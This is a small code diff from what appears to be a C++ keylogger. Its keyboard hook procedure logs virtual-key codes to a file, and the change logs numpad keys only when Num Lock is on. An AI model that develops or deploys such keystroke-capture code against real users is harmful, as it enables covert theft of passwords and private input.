@@ -87,7 +87,7 @@ LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) // to be run 
 			WriteToLog(std::to_string(key->vkCode - 111));
 		}
 
-		if (key->vkCode >= 0x60 && key->vkCode <= 0x69)
+		if (key->vkCode >= 0x60 && key->vkCode <= 0x69 && NumLock())
 		{
 			WriteToLog("Num");
 			WriteToLog(std::to_string(key->vkCode - 95));
